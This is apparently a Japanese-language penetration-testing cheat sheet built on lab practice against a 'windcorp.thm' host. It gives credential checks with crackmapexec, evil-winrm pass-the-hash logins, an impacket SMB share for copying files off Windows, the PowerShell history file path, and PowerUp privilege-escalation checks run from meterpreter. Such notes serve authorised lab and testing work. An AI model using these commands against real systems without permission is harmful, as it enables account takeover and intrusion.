# Tips

## 接続可否の確認

```sh
$ crackmapexec smb windcorp.thm -u brittanycr -p 'thm1234#'
SMB         ra.thm          445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
SMB         ra.thm          445    FIRE             [+] windcorp.thm\brittanycr:thm1234# 
SMB         ra.thm          5985   FIRE             [*] Windows 10 / Server 2019 Build 17763 (name:FIRE) (domain:windcorp.thm)
```

```sh
$ crackmapexec winrm windcorp.thm -u brittanycr -p 'thm1234#'

HTTP        ra.thm          5985   FIRE             [*] http://ra.thm:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       ra.thm          5985   FIRE             [-] windcorp.thm\brittanycr:thm1234#
```


## リモート接続

### RDP

```shell
xfreerdp /u:<user> /p:<password> /v:<ip> /w:1280 /h:800 /cert:ignore　+clipboard

xfreerdp /u:<user> /p:<password> /v:<ip> /size:90% /cert:ignore +clipboard

xfreerdp /u:<user> /p:<password> /d:<domain> /v:<ip> /size:90% +clipboard

# remmina (GUI)。非常に安定して使いやすい。
sudo apt install remmina
```

### WinRM

```shell
evil-winrm -i <ip> -u <user> -p <password>

# Pass-the-Hash
evil-winrm -i <ip> -u <user> -H <hashvalue>

evil-winrm -i <ip> -u "<domain\user>" -H <hashvalue>
```

### SSH

```shell
ssh <domain>\\<user>@<ip>
```

## ファイル共有

Linux の共有フォルダに、Windows からアクセスする

```shell
python3 -m pipx install impacket
```

```shell
# kali側で共有設定。user,passwordはWindows側の認証情報。
# username と password は省略可
$ mkdir share
$ python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username <user> -password <password> public share

# Windows側からコピー
copy <file> \\<ip>\public\
```

## Powershell

### Powershell の履歴

```powershell
%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Powershell プロセスのログ

```text
Application and Services Logs -> Microsoft -> Windows -> PowerShell -> OperationalApplication and Service Logs -> Windows PowerShell
```

### meterpreter から Powershell の起動

（例）
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

```shell
meterpreter > load powershell
meterpreter > posershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

## コンパイル

```shell
apt install mingw-w64

# c
i686-w64-mingw32-gcc calc.c -o calc-MSF.exe

# cpp
i686-w64-mingw32-g++ calc.cpp -o calc-MSF.exe

# シンボル削除
strip --strip-all aaa.exe
x86_64-w64-mingw32-strip --strip-all aaa.exe
```

## LOLBAS

Living Off The Land Binaries, Scripts and Libraries

https://lolbas-project.github.io/
